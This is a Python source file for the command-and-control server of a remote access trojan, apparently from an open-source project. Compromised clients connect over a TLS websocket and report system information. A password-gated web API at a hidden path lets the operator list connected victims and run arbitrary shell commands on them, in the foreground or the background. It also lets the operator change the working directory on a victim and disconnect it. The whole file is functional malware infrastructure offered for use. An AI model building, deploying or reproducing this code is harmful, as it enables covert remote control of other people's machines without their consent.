__author__ = "赵博凯"
__license__ = "GPL v3"

from quart import Quart, redirect, url_for, request, make_response, render_template, jsonify, websocket
import asyncio
import websockets
import hashlib
import ssl
import rich
import json
from sys import exit
import logging

import rich.traceback 
import rich.logging

# 配置Rich的回溯追踪
rich.traceback.install(show_locals=True)

# 日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[rich.logging.RichHandler()])

# 服务器配置
HOST = '0.0.0.0' 
PORT = 8765
WEB_PORT = 5000
SSL_CERT = '../cert.pem' 
SSL_KEY = '../key.pem'
SECURITY_PATH = 'fuck'
SECURITY_PASSWORD_HASH = '6ac3c336e4094835293a3fed8a4b5fedde1b5e2626d9838fed50693bba00af0e' 

# 全局变量
app = Quart(__name__)
control_list = {}

# 服务器核心类
class Server:
    def __init__(self):
        logging.info("服务器初始化")

    def about(self):
        logging.info("获取关于信息")
        about_text = '''关于：
作者：赵博凯
版权：Copyright © 赵博凯, All Rights Reserved.
此为开源软件，链接：[link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]
使用GPL v3协议，请自觉遵守协议。'''
        return about_text
    
    def client_list(self):
        logging.info("获取客户端列表")
        if len(control_list) == 0:
            logging.info("当前无连接设备")
            return "当前没有设备连接。"
        else:
            devices = []
            for device in control_list.items():
                devices.append({
                    'id': device[0],
                    'ip': device[1]['ip'],
                    'status': device[1]['status'],
                    'systeminfo': device[1]['systeminfo']
                })
            logging.info(f"设备列表：{devices}")
            return devices
    
    async def delete(self, id):
        logging.info(f"删除设备：{id}")
        global control_list
        if id in control_list:
            websocket_ = control_list[id]['websocket']
            try:
                await websocket_.send("exit")
                control_list.pop(id)
                logging.info(f"设备 {id} 删除成功")
                return f"成功删除ID为{id}的设备。"
            except Exception as e:
                control_list.pop(id)
                logging.error(f"删除设备 {id} 失败：{str(e)}")
                return f"断开设备ID为{id}的连接时发生异常: {e}"
        else:
            logging.error(f"设备 {id} 不存在")
            return f"设备ID为{id}的设备不存在。"

# 客户端控制类
class ControlClient:
    def __init__(self, id):
        logging.info(f"初始化客户端控制器：{id}")
        self.id = id
        self.websocket = control_list[id]['websocket']
    
    async def execute_command(self, command):
        logging.info(f"执行命令：{command}")
        try:
            await self.websocket.send(f"command:{command}")
            result = await self.websocket.recv()
            logging.info(f"命令结果：{result}")
            return result
        except Exception as e:
            logging.error(f"命令执行失败：{str(e)}")
            raise

    async def background(self, command):
        logging.info(f"后台执行命令：{command}")
        try:
            await self.websocket.send(f"background:{command}")
            await self.websocket.recv()
            logging.info("后台命令发送成功")
            return "命令已发送"
        except Exception as e:
            logging.error(f"后台命令执行失败：{str(e)}")
            raise

    async def change_directory(self, directory):
        logging.info(f"切换目录：{directory}")
        try:
            await self.websocket.send(f"change_directory:{directory}")
            result = await self.websocket.recv()
            logging.info(f"目录切换结果：{result}")
            return result
        except Exception as e:
            logging.error(f"目录切换失败：{str(e)}")
            raise

# 安全验证函数
def check():
    logging.info("执行安全验证")
    logging.debug(f"请求cookies：{request.cookies}")
    if "Cookie" not in request.cookies:
        logging.warning("未找到Cookie")
        return False
    if request.cookies.get('Cookie') == hashlib.sha256(SECURITY_PASSWORD_HASH.encode()).hexdigest():
        logging.info("验证通过")
        return True
    else:
        logging.warning("验证失败")
        return False

# 密码验证路由
@app.route(f"/{SECURITY_PATH}/verify", methods=['POST'])
async def verify():
    logging.info("收到密码验证请求")
    try:
        json_data = await request.get_json()
        if "password" not in json_data:
            logging.warning("未提供密码")
            return jsonify({'error': '未提供密码'}), 400
        
        password = json_data["password"]
        if hashlib.sha256(password.encode()).hexdigest() == SECURITY_PASSWORD_HASH:
            logging.info("密码验证成功")
            cookie = hashlib.sha256(SECURITY_PASSWORD_HASH.encode()).hexdigest()
            return jsonify({'Cookie': cookie})
        else:
            logging.warning("密码错误")
            return jsonify({'error': '密码错误'}), 401
    except Exception as e:
        logging.error(f"验证过程错误：{str(e)}")
        return jsonify({'error': '服务器错误'}), 500

# API功能路由
@app.route(f"/{SECURITY_PATH}/function", methods=['POST'])
async def function():
    logging.info("收到功能请求")
    try:
        if not check():
            logging.warning("未授权请求")
            return jsonify({'error': '未授权'}), 401

        json_data = await request.get_json()
        logging.debug(f"请求数据：{json_data}")
        
        if json_data is None or "func_name" not in json_data:
            logging.warning("未提供函数名")
            return jsonify({'error': '未提供函数名'}), 400

        func_name = json_data["func_name"]
        logging.info(f"请求功能：{func_name}")

        valid_functions = ["device_list", "delete", "command", "background", "change_directory"]
        if func_name not in valid_functions:
            logging.warning(f"无效功能：{func_name}")
            return jsonify({'error': '未提供有效的函数名'}), 400

        server = Server()

        if func_name == "device_list":
            return jsonify(server.client_list())
        
        if "id" not in json_data:
            logging.warning("未提供设备ID")
            return jsonify({'error': '未提供设备ID'}), 400
        
        device_id = json_data["id"]
        logging.info(f"目标设备：{device_id}")
        
        if not any(device_id in device.values() for device in server.client_list()):
            logging.warning(f"设备不存在：{device_id}")
            return jsonify({'error': '设备ID不存在'}), 400
        
        if func_name == "delete":
            return jsonify({"message": await server.delete(device_id)})
        
        control_client = ControlClient(device_id)
        
        if func_name in ["command", "background"]:
            if "command" not in json_data:
                logging.warning("未提供命令")
                return jsonify({'error': '未提供命令'}), 400
            
            command = json_data["command"]
            if func_name == "command":
                return jsonify({"message": await control_client.execute_command(command)})
            else:
                return jsonify({"message": await control_client.background(command)})
        
        if func_name == "change_directory":
            if "directory" not in json_data:
                logging.warning("未提供目录")
                return jsonify({'error': '未提供目录'}), 400
            
            directory = json_data["directory"]
            return jsonify({"message": await control_client.change_directory(directory)})
    
    except Exception as e:
        logging.error(f"请求处理错误：{str(e)}")
        return jsonify({'error': str(e)}), 500

# WebSocket客户端处理
async def handle_client(websocket):
    ip = websocket.remote_address[0] + ":" + str(websocket.remote_address[1])
    logging.info(f"新客户端连接：{ip}")
    
    try:
        systeminfo = await websocket.recv()
        logging.info(f"客户端系统信息：{systeminfo}")
    except Exception as e:
        logging.error(f"获取系统信息失败：{str(e)}")
        systeminfo = "ERROR"
    
    control_list[str(websocket.id)] = {
        "ip": ip,
        "status": "connected",
        "websocket": websocket,
        "systeminfo": systeminfo
    }
    
    logging.info(f"客户端 {ip} 连接成功，ID：{websocket.id}")
    try:
        await websocket.wait_closed()
    except Exception as e:
        logging.error(f"连接异常：{str(e)}")
    finally:
        if str(websocket.id) in control_list:
            del control_list[str(websocket.id)]
            logging.info(f"客户端 {ip} 断开连接")

# 客户端连接状态检查
async def check_clients_connection():
    logging.info("启动连接状态检查")
    while True:
        try:
            if len(control_list) > 0:
                logging.debug("检查客户端状态")
                for device_id, device_info in list(control_list.items()):
                    try:
                        await device_info['websocket'].ping()
                        if device_info['status'] != "connected":
                            logging.info(f"设备 {device_id} 重连")
                            device_info['status'] = "connected"
                    except Exception as e:
                        if device_info['status'] != "disconnected":
                            logging.warning(f"设备 {device_id} 断开：{str(e)}")
                            device_info['status'] = "disconnected"
            await asyncio.sleep(10)
        except Exception as e:
            logging.error(f"状态检查错误：{str(e)}")
            await asyncio.sleep(10)

# 服务器主循环
async def server_loop():
    logging.info("初始化服务器")
    logging.info(f"证书路径：{SSL_CERT}，密钥路径：{SSL_KEY}")
    
    try:
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(SSL_CERT, SSL_KEY)
        logging.info("SSL证书加载成功")
    except FileNotFoundError:
        logging.error("证书文件不存在")
        exit(1)
    except Exception as e:
        logging.error(f"SSL加载失败：{str(e)}")
        exit(1)

    logging.info(f"启动服务器：{HOST}:{PORT}")
    try:
        async with websockets.serve(handle_client, HOST, PORT, ssl=ssl_context):
            logging.info("服务器启动成功")
            try:
                await asyncio.Event().wait()
            except KeyboardInterrupt:
                logging.info("服务器关闭中...")
    except Exception as e:
        logging.error(f"服务器启动失败：{str(e)}")
        exit(1)

# 主程序入口
async def main():
    logging.info("程序启动")
    try:
        await asyncio.gather(
            server_loop(),
            check_clients_connection(),
            app.run_task(host='0.0.0.0', port=WEB_PORT)
        )
    except Exception as e:
        logging.error(f"程序错误：{str(e)}")
        exit(1)

if __name__ == '__main__':
    try:
        print("\033[H\033[J")
        logging.info("版权所有：Copyright © 赵博凯, All Rights Reserved.")
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.warning("程序被用户中断")
        exit(0)
    except Exception as e:
        logging.critical(f"致命错误：{str(e)}")
        logging.error("请报告到[link=https://github.com/zhaobokai341/remote_access_trojan/issues]Issues[/link]")
        exit(1)
